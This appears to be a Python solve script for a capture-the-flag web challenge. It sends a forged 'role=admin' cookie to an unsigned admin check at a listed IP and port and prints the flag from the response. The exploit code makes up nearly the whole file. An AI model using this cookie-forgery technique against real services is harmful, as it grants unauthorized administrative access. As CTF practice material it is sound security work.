#!/usr/bin/env python3
"""Midnight Feedback (web, 450) — Birchwood Post @ 54.72.82.22:8111

The "keeper's desk" guard on /admin/notes trusts a client-controlled cookie:

    Cookie: role=admin

No login, no signature. Send it and the staff hollow prints the flag.
"""
import http.client

HOST, PORT = "54.72.82.22", 8111


def req(method, path, body=None, headers=None, timeout=10):
    c = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    h = {"Connection": "close", "User-Agent": "curl/8.5.0"}
    if headers:
        h.update(headers)
    try:
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        return r.status, dict(r.getheaders()), r.read()
    finally:
        c.close()


if __name__ == "__main__":
    st, hd, data = req("GET", "/admin/notes", headers={"Cookie": "role=admin"})
    print(f"[*] GET /admin/notes -> {st}")
    text = data.decode(errors="replace")
    import re
    m = re.search(r"safctf\{[^}]+\}", text)
    print(text)
    if m:
        print(f"\n[+] FLAG: {m.group(0)}")
